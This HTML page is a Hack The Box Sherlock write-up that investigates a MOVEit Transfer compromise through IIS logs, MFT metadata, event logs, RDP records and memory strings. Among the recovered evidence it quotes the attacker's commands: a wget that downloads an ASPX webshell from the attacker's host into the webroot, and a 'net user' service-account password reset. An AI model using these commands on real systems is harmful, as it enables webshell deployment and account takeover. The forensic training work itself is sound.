@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>I Like To | Hack The Box Writeup</title>
+  <meta name="description"
+    content="I Like To HTB Sherlock writeup covering MOVEit compromise analysis, IIS logs, MFT timestamps, Windows event logs, RDP activity, PowerShell history, memory strings, and webshell investigation.">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/css/main.css?v=20260508-spacing" rel="stylesheet">
+</head>
+
+<body>
+  <main class="main">
+    <section class="section">
+      <div class="container writeup-detail">
+        <div class="detail-box">
+          <div class="writeup-detail-header">
+            <a class="back-link top" href="../index.html#writeups">Back to Writeups</a>
+          </div>
+
+          <h1>I Like To</h1>
+          <div class="writeup-platform detail"><i class="bi bi-shield-check"></i><span>Hack The Box</span></div>
+          <div class="tag-list">
+            <span class="tag">Blue Team</span>
+            <span class="tag">Easy</span>
+            <span class="tag">Windows</span>
+            <span class="tag">DFIR</span>
+            <span class="tag">Incident Response</span>
+            <span class="tag">Threat Hunting</span>
+            <span class="tag">Digital Forensics</span>
+            <span class="tag">MOVEit</span>
+            <span class="tag">IIS Logs</span>
+            <span class="tag">Webshell Analysis</span>
+            <span class="tag">MFT Analysis</span>
+            <span class="tag">Event Log Analysis</span>
+            <span class="tag">RDP Analysis</span>
+            <span class="tag">PowerShell History</span>
+            <span class="tag">Memory Analysis</span>
+            <span class="tag">IOC Extraction</span>
+          </div>
+
+          <h2>Overview</h2>
+          <p>
+            I Like To is a Blue Team Sherlock focused on investigating a MOVEit Transfer compromise. The analysis
+            combines IIS web logs, NTFS metadata, Windows Security and Terminal Services event logs, PowerShell history,
+            MOVEit database artifacts, and memory strings to reconstruct how the attacker enumerated the server,
+            uploaded webshells, changed a service account password, accessed the host remotely, and interacted with the
+            deployed webshell.
+          </p>
+          <figure>
+            <img src="../assets/img/ILikeTo/00-sherlock-overview.png" alt="Triage evidence tree for the I Like To Sherlock">
+            <figcaption>The triage package included filesystem artifacts, logs, a MOVEit database export, and a memory dump.</figcaption>
+          </figure>
+
+          <h2>Evidence and Tools</h2>
+          <p>The investigation used the provided triage directory and memory dump:</p>
+          <pre><code class="language-text">I-like-to-27a787c5.vmem
+Triage\</code></pre>
+          <p>Tools and artifacts used during the investigation:</p>
+          <ul>
+            <li><strong>IIS logs</strong> for webshell and attacker User-Agent activity.</li>
+            <li><strong>MFTECmd</strong> for parsing NTFS <code>$MFT</code> metadata.</li>
+            <li><strong>EvtxECmd</strong> for parsing Windows Event Logs.</li>
+            <li><strong>PowerShell</strong> for searching CSV, logs, and history files.</li>
+            <li><strong>strings</strong> for extracting webshell and password artifacts from memory.</li>
+          </ul>
+
+          <h2>Task 1 - Uploaded ASPX Webshell</h2>
+          <p><strong>Question:</strong> Name of the ASPX webshell uploaded by the attacker?</p>
+          <p>
+            Because the scenario referenced a MOVEit Transfer compromise, the first useful pivot was the IIS web server
+            logs. MOVEit exploitation campaigns commonly involve malicious ASP.NET webshells, so I searched the triage
+            artifacts for <code>.aspx</code> references.
+          </p>
+          <pre><code class="language-bash">grep -Ri ".aspx" iliketo/Triage/</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/01-grep-aspx-triage.png" alt="Searching triage artifacts for ASPX references">
+            <figcaption>Searching for ASPX references revealed suspicious activity in the IIS logs.</figcaption>
+          </figure>
+          <p>The relevant log file was:</p>
+          <pre><code class="language-text">Triage/uploads/auto/C%3A/inetpub/logs/LogFiles/W3SVC2/u_ex230712.log</code></pre>
+          <p>Inside that log, the suspicious request was:</p>
+          <pre><code class="language-text">2023-07-12 11:24:47 10.10.0.25 POST /move.aspx - 443 - 10.255.254.3 Mozilla</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/02-iis-move-aspx-entry.png" alt="IIS log entry showing POST request to move.aspx">
+            <figcaption>The attacker interacted with <code>/move.aspx</code> using an HTTP POST request.</figcaption>
+          </figure>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">move.aspx</code></pre>
+
+          <h2>Task 2 - Attacker IP Address</h2>
+          <p><strong>Question:</strong> What was the attacker's IP address?</p>
+          <p>
+            The same IIS log entry identifies both the victim web server and the remote client. In this request,
+            <code>10.10.0.25</code> is the victim server and <code>10.255.254.3</code> is the client interacting with
+            the malicious webshell.
+          </p>
+          <pre><code class="language-text">2023-07-12 11:24:47 10.10.0.25 POST /move.aspx - 443 - 10.255.254.3 Mozilla</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/03-attacker-ip-iis-log.png" alt="IIS log evidence identifying attacker IP address">
+            <figcaption>The remote client IP in the webshell request identifies the attacker.</figcaption>
+          </figure>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">10.255.254.3</code></pre>
+
+          <h2>Task 3 - Initial Attack User-Agent</h2>
+          <p><strong>Question:</strong> What user agent was used to perform the initial attack?</p>
+          <p>To identify the User-Agent used during exploitation, I searched the IIS logs for the attacker IP.</p>
+          <pre><code class="language-bash">grep -Ri "10.255.254.3" iliketo/Triage/uploads/auto/C%3A/inetpub/logs/LogFiles/W3SVC2/</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/04-grep-attacker-ip-iis.png" alt="Searching IIS logs for the attacker IP address">
+            <figcaption>Filtering for the attacker IP showed scanning, browsing, and exploit-related requests.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/ILikeTo/05-user-agent-ruby-activity.png" alt="IIS log entries showing Ruby User-Agent for exploit activity">
+            <figcaption>MOVEit-specific API requests used the <code>Ruby</code> User-Agent.</figcaption>
+          </figure>
+          <p>The activity showed three phases:</p>
+          <ul>
+            <li>Nmap scanning with the Nmap Scripting Engine User-Agent.</li>
+            <li>Browser interaction using Firefox on Linux.</li>
+            <li>Initial MOVEit exploitation requests using <code>Ruby</code>.</li>
+          </ul>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">Ruby</code></pre>
+
+          <h2>Task 4 - ASPX Webshell Upload Time</h2>
+          <p><strong>Question:</strong> When was the ASPX webshell uploaded by the attacker? (UTC)</p>
+          <p>To confirm the upload time, I parsed the NTFS <code>$MFT</code> and searched for <code>move.aspx</code>.</p>
+          <pre><code class="language-powershell">.\MFTECmd.exe -f 'C:\Users\moree39\Downloads\Triage\uploads\ntfs\%5C%5C.%5CC%3A\$MFT' --json 'C:\Temp\MFTJson'</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/06-mftecmd-json-parse.png" alt="MFTECmd parsing the I Like To MFT evidence">
+            <figcaption>MFTECmd parsed the raw NTFS metadata so the webshell record could be reviewed.</figcaption>
+          </figure>
+          <p>Then I searched the parsed output for the malicious file:</p>
+          <pre><code class="language-powershell">Import-Csv 'C:\Temp\MFTOut\20260506190952_MFTECmd_$MFT_Output.csv' | Where-Object {$_.FileName -like '*move.aspx*'} | Format-List</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/07-mft-move-aspx-timestamp.png" alt="MFT output showing move.aspx creation timestamp">
+            <figcaption>The MFT entry for <code>move.aspx</code> showed the filesystem creation timestamp.</figcaption>
+          </figure>
+          <p>The relevant timestamp was:</p>
+          <pre><code class="language-text">Created0x10 : 2023-07-12 11:24:30</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">12/07/2023 11:24:30 UTC</code></pre>
+
+          <h2>Task 5 - Failed ASP Webshell Size</h2>
+          <p><strong>Question:</strong> The attacker uploaded an ASP webshell which did not work. What is its filesize in bytes?</p>
+          <p>
+            The failed webshell was <code>moveit.asp</code>. Even if a file is deleted or never works correctly, NTFS
+            metadata can still preserve its name, timestamps, and size in the <code>$MFT</code>.
+          </p>
+          <p>Parse the MFT to CSV:</p>
+          <pre><code class="language-powershell">.\MFTECmd.exe -f 'C:\Users\moree39\Downloads\Triage\uploads\ntfs\%5C%5C.%5CC%3A\$MFT' --csv 'C:\Temp\MFTOut'</code></pre>
+          <p>Search for the failed ASP webshell:</p>
+          <pre><code class="language-powershell">Import-Csv 'C:\Temp\MFTOut\20260506190952_MFTECmd_$MFT_Output.csv' | Where-Object {$_.FileName -like '*moveit.asp*'} | Format-List</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/08-mft-moveit-asp-filesize.png" alt="MFT output showing moveit.asp filesize">
+            <figcaption>The MFT record for <code>moveit.asp</code> shows the failed ASP webshell filesize.</figcaption>
+          </figure>
+          <p>The output showed:</p>
+          <pre><code class="language-text">FileName : moveit.asp
+FileSize : 1362</code></pre>
+          <p>This matched the attack flow: the attacker first attempted <code>moveit.asp</code>, then switched to the working <code>move.aspx</code> webshell.</p>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">1362 bytes</code></pre>
+
+          <h2>Task 6 - Initial Enumeration Tool</h2>
+          <p><strong>Question:</strong> Which tool did the attacker use to initially enumerate the vulnerable server?</p>
+          <p>The IIS logs clearly showed the Nmap Scripting Engine User-Agent:</p>
+          <pre><code class="language-text">Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)</code></pre>
+          <p>This indicates the attacker used Nmap, specifically NSE scripts, to enumerate the target web server before exploitation.</p>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">Nmap</code></pre>
+
+          <h2>Task 7 - Service Account Password Reset Time</h2>
+          <p><strong>Question:</strong> We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC).</p>
+          <p>The target service account was:</p>
+          <pre><code class="language-text">moveitsvc</code></pre>
+          <p>Password reset activity is recorded in Windows Security logs with Event ID 4724.</p>
+          <p>I created variables to make the investigation easier:</p>
+          <pre><code class="language-powershell">$triage = "C:\Users\moree39\Downloads\Triage"
+$logs = "$triage\uploads\auto\C%3A\Windows\System32\winevt\Logs"
+$sec = "$logs\Security.evtx"
+$tools = "C:\Users\moree39\Desktop\Tools\Get-ZimmermanTools-master\net9"
+$out = "C:\Temp\EvtxOut"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/08-evtx-variables-setup.png" alt="PowerShell variables used for EVTX analysis">
+            <figcaption>PowerShell variables made the EVTX parsing commands easier to reuse.</figcaption>
+          </figure>
+          <p>Parse the Security event log:</p>
+          <pre><code class="language-powershell">&amp; "$tools\EvtxeCmd\EvtxECmd.exe" -f $sec --csv $out</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/09-security-evtx-parse.png" alt="EvtxECmd parsing Security.evtx">
+            <figcaption>Security.evtx was parsed into CSV for easier filtering.</figcaption>
+          </figure>
+          <p>Search for password reset events:</p>
+          <pre><code class="language-powershell">Import-Csv "C:\Temp\EvtxOut\20260508091243_EvtxECmd_Output.csv" | Where-Object { $_.EventId -eq 4724 } | Format-List TimeCreated, EventId, PayloadData1</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/10-password-reset-event-4724.png" alt="Security Event ID 4724 showing moveitsvc password reset">
+            <figcaption>Event ID 4724 confirmed the password reset for the <code>moveitsvc</code> account.</figcaption>
+          </figure>
+          <p>Relevant event:</p>
+          <pre><code class="language-text">TimeCreated : 2023-07-12 11:09:27
+EventId     : 4724
+Target      : MOVER\moveitsvc</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">12/07/2023 11:09:27 UTC</code></pre>
+
+          <h2>Task 8 - Remote Access Protocol</h2>
+          <p><strong>Question:</strong> Which protocol did the attacker utilize to remote into the compromised machine?</p>
+          <p>
+            I first checked <code>Security.evtx</code> for successful logon events and possible Logon Type 10 activity,
+            then pivoted to the dedicated Remote Desktop event logs.
+          </p>
+          <figure>
+            <img src="../assets/img/ILikeTo/11-security-logon-rdp-check.png" alt="Checking Security event logs for RDP logon activity">
+            <figcaption>Security logon events were checked before pivoting to Terminal Services logs.</figcaption>
+          </figure>
+          <p>Parse the RDP-related operational log:</p>
+          <pre><code class="language-powershell">&amp; "$tools\EvtxeCmd\EvtxECmd.exe" -f "$logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%254Operational.evtx" --csv "C:\Temp\WinRMOut"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/12-rdp-evtx-parse.png" alt="Parsing remote access event logs with EvtxECmd">
+            <figcaption>Remote access logs were parsed into CSV for analysis.</figcaption>
+          </figure>
+          <p>Filter for Event ID 1149, which indicates successful Remote Desktop authentication:</p>
+          <pre><code class="language-powershell">Get-ChildItem "C:\Temp\RDPOut\*.csv" | ForEach-Object {
+    Import-Csv $_.FullName
+} | Where-Object { $_.EventId -eq 1149 } |
+Format-List TimeCreated, EventId, PayloadData1, PayloadData2, PayloadData3</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/13-rdp-event-1149.png" alt="Event ID 1149 confirming successful RDP authentication">
+            <figcaption>Event ID 1149 confirmed Remote Desktop authentication.</figcaption>
+          </figure>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">RDP</code></pre>
+
+          <h2>Task 9 - Remote Access Time</h2>
+          <p><strong>Question:</strong> Please confirm the date and time the attacker remotely accessed the compromised machine.</p>
+          <p>To reconstruct the RDP timeline, I parsed Terminal Services logs.</p>
+          <pre><code class="language-powershell">&amp; "$tools\EvtxeCmd\EvtxECmd.exe" -f "$logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%254Operational.evtx" --csv "C:\Temp\RDPOut"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/14-remoteconnectionmanager-parse.png" alt="Parsing RemoteConnectionManager event log">
+            <figcaption>The RemoteConnectionManager log contains RDP connection and authentication activity.</figcaption>
+          </figure>
+          <pre><code class="language-powershell">&amp; "$tools\EvtxeCmd\EvtxECmd.exe" -f "$logs\Microsoft-Windows-TerminalServices-LocalSessionManager%254Operational.evtx" --csv "C:\Temp\RDPOut"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/15-localsessionmanager-parse.png" alt="Parsing LocalSessionManager event log">
+            <figcaption>The LocalSessionManager log helps confirm when the remote session became active.</figcaption>
+          </figure>
+          <p>Filter the parsed events for the attack day:</p>
+          <pre><code class="language-powershell">Get-ChildItem "C:\Temp\RDPOut\*.csv" | ForEach-Object {
+    Import-Csv $_.FullName
+} | Where-Object {
+    [datetime]$_.TimeCreated -ge [datetime]"2023-07-12 00:00:00" -and
+    [datetime]$_.TimeCreated -lt [datetime]"2023-07-13 00:00:00"
+} | Sort-Object TimeCreated | Format-Table TimeCreated, EventId, PayloadData1</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/16-rdp-session-timeline.png" alt="RDP session timeline sorted by event time">
+            <figcaption>The RDP session timeline shows connection, authentication, and session start events.</figcaption>
+          </figure>
+          <p>The relevant sequence was:</p>
+          <pre><code class="language-text">11:11:13  Event 261   -> RDP-Tcp connection
+11:11:16  Event 1149  -> Successful RDP authentication
+11:11:18  Event 41    -> Remote interactive session started
+11:11:19  Event 21    -> Session logon succeeded
+11:11:19  Event 22    -> Desktop/session fully loaded</code></pre>
+          <p>HTB accepted the active RDP session start, represented by Event ID 41.</p>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">12/07/2023 11:11:18 UTC</code></pre>
+
+          <h2>Task 10 - Webshell Access User-Agent</h2>
+          <p><strong>Question:</strong> What was the useragent that the attacker used to access the webshell?</p>
+          <p>I searched the IIS log for requests to <code>move.aspx</code>.</p>
+          <pre><code class="language-powershell">Select-String -Path "$triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log" -Pattern "move.aspx"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/17-webshell-user-agent.png" alt="IIS log entries showing User-Agent used to access move.aspx">
+            <figcaption>The webshell requests exposed the browser User-Agent used by the attacker.</figcaption>
+          </figure>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0</code></pre>
+
+          <h2>Task 11 - Attacker Inst ID</h2>
+          <p><strong>Question:</strong> What is the inst ID of the attacker?</p>
+          <p>To identify the attacker's Inst ID, I pivoted from the attacker IP into the MOVEit database dump.</p>
+          <pre><code class="language-powershell">Select-String -Path "$triage\uploads\moveit.sql" -Pattern "10.255.254.3"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/18-moveit-sql-inst-id.png" alt="MOVEit SQL dump showing attacker Inst ID">
+            <figcaption>The MOVEit SQL dump contained log rows tied to the attacker IP and Ruby User-Agent.</figcaption>
+          </figure>
+          <p>Inside the suspicious <code>msg_post</code> rows, the second value after the action was the Inst ID:</p>
+          <pre><code class="language-text">'msg_post',1234,...,'10.255.254.3',...,'Ruby'</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">1234</code></pre>
+
+          <h2>Task 12 - Webshell Retrieval Command</h2>
+          <p><strong>Question:</strong> What command was run by the attacker to retrieve the webshell?</p>
+          <p>
+            After searching logs for generic download keywords, I pivoted to a stronger artifact: the PowerShell
+            PSReadLine history for the compromised <code>moveitsvc</code> account.
+          </p>
+          <pre><code class="language-powershell">Get-Content "$triage\uploads\auto\C%3A\Users\moveitsvc.WIN-LR8T2EF8VHM.002\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/19-powershell-history-webshell-download.png" alt="PowerShell history showing wget command used to download move.aspx">
+            <figcaption>PSReadLine history preserved the command used to download the ASPX webshell.</figcaption>
+          </figure>
+          <p>The history showed the attacker moved into the MOVEit webroot and downloaded the webshell:</p>
+          <pre><code class="language-powershell">cd C:\MOVEitTransfer\wwwroot</code></pre>
+          <pre><code class="language-powershell">wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-powershell">wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx</code></pre>
+
+          <h2>Task 13 - Webshell Title</h2>
+          <p><strong>Question:</strong> What string was found inside the <code>&lt;title&gt;</code> tag of the deployed webshell?</p>
+          <p>
+            The webshell file itself was not present in the triage collection, so I searched the memory dump for unique
+            webshell strings instead of relying only on disk artifacts.
+          </p>
+          <pre><code class="language-bash">strings -a I-like-to-27a787c5.vmem | grep -i -A30 -B10 "form name=\"cmd\""</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/20-memory-webshell-title.png" alt="Memory strings showing webshell title">
+            <figcaption>Memory analysis recovered the ASP.NET webshell HTML and its title tag.</figcaption>
+          </figure>
+          <p>The recovered HTML contained:</p>
+          <pre><code class="language-html">&lt;title&gt;awen asp.net webshell&lt;/title&gt;</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">awen asp.net webshell</code></pre>
+
+          <h2>Task 14 - Service Account Password</h2>
+          <p><strong>Question:</strong> What password did the attacker set for the <code>moveitsvc</code> account?</p>
+          <p>
+            Since the attacker interacted with a webshell capable of executing commands, I searched the memory dump for
+            references to the <code>moveitsvc</code> account.
+          </p>
+          <pre><code class="language-bash">strings I-like-to-27a787c5.vmem | grep -i "moveitsvc"</code></pre>
+          <figure>
+            <img src="../assets/img/ILikeTo/21-memory-moveitsvc-password.png" alt="Memory strings showing net user command for moveitsvc">
+            <figcaption>Memory strings revealed a command changing the service account password.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/ILikeTo/22-memory-password-confirmation.png" alt="Memory strings confirming moveitsvc password value">
+            <figcaption>The recovered command confirmed the password value set for <code>moveitsvc</code>.</figcaption>
+          </figure>
+          <p>The recovered command was:</p>
+          <pre><code class="language-text">net user "moveitsvc" 5trongP4ssw0rd</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">5trongP4ssw0rd</code></pre>
+
+          <h2>Attack Chain</h2>
+          <pre><code class="language-text">1. Attacker enumerates the MOVEit server with Nmap.
+2. Exploitation activity uses Ruby against MOVEit endpoints.
+3. The attacker uploads a failed ASP webshell: moveit.asp.
+4. The attacker uploads and uses the working ASPX webshell: move.aspx.
+5. The moveitsvc password is reset.
+6. The attacker accesses the host through RDP.
+7. PowerShell history shows the webshell retrieval command.
+8. Memory analysis recovers webshell content and the service account password.</code></pre>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li>IIS logs are extremely useful for identifying webshell names, attacker IPs, and User-Agents.</li>
+            <li>NTFS <code>$MFT</code> metadata can preserve file size and timestamp evidence even when files are not directly available.</li>
+            <li>Windows Event Logs provide reliable evidence for password reset and RDP activity.</li>
+            <li>PowerShell history can expose attacker commands that may not be obvious in event logs.</li>
+            <li>Memory strings can recover webshell content and command artifacts missed by disk-only analysis.</li>
+          </ul>
+
+          <a class="back-link bottom" href="../index.html#writeups">Back to Writeups</a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script src="../assets/vendor/bootstrap/js/bootstrap.bundle.min.js" defer></script>
+  <script src="../assets/js/main.js" defer></script>
+</body>
+
+</html>
